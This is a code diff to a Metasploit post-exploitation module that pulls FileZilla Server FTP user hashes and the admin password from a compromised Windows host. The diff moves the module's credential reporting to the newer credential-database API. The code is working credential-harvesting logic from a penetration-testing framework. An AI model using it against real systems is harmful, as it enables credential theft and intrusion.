@@ -33,13 +33,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    drive = session.sys.config.getenv('SystemDrive')
-    case session.platform
-    when /win64/i
-      @progs = drive + '\\Program Files (x86)\\'
-    when /win32/i
-      @progs = drive + '\\Program Files\\'
-    end
+    @progs = "#{session.sys.config.getenv('ProgramFiles')}\\"
 
     filezilla = check_filezilla
     if filezilla != nil
@@ -147,20 +141,39 @@ class Metasploit3 < Msf::Post
         source_id = nil
       end
 
-      # report the goods!
-      report_auth_info(
-        :host  => session.sock.peerhost,
-        :port => config['ftp_port'],
-        :sname => 'ftp',
-        :proto => 'tcp',
-        :user => cred['user'],
-        :pass => cred['password'],
-        :ptype => "MD5 hash",
-        :source_id => source_id,
-        :source_type => "exploit",
-        :target_host => config['ftp_bindip'],
-        :target_port => config['ftp_port']
-      )
+
+      service_data = {
+          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+          port: config['ftp_port'],
+          service_name: 'ftp',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+          origin_type: :session,
+          jtr_format: 'raw-md5',
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          private_type: :nonreplayable_hash,
+          private_data: cred['password'],
+          username: cred['user']
+      }
+
+      credential_data.merge!(service_data)
+
+      credential_core = create_credential(credential_data)
+
+      # Assemble the options hash for creating the Metasploit::Credential::Login object
+      login_data ={
+          core: credential_core,
+          status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      # Merge in the service data and create our Login
+      login_data.merge!(service_data)
+      login = create_credential_login(login_data)
+
     end
 
     perms.each do |perm|
@@ -190,19 +203,37 @@ class Metasploit3 < Msf::Post
       #the module will crash with an error.
       vprint_status("(No admin information found.)")
     else
-      report_auth_info(
-        :host  => session.sock.peerhost,
-        :port => config['admin_port'],
-        :sname => 'filezilla-admin',
-        :proto => 'tcp',
-        :user => 'admin',
-        :pass => config['admin_pass'],
-        :type => "password",
-        :source_id => source_id,
-        :source_type => "exploit",
-        :target_host => config['admin_bindip'],
-        :target_port => config['admin_port']
-      )
+      service_data = {
+          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+          port: config['admin_port'],
+          service_name: 'filezilla-admin',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          private_type: :password,
+          private_data: config['admin_pass'],
+          username: 'admin'
+      }
+
+      credential_data.merge!(service_data)
+
+      credential_core = create_credential(credential_data)
+
+      # Assemble the options hash for creating the Metasploit::Credential::Login object
+      login_data ={
+          core: credential_core,
+          status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      # Merge in the service data and create our Login
+      login_data.merge!(service_data)
+      login = create_credential_login(login_data)
+
     end
 
     p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
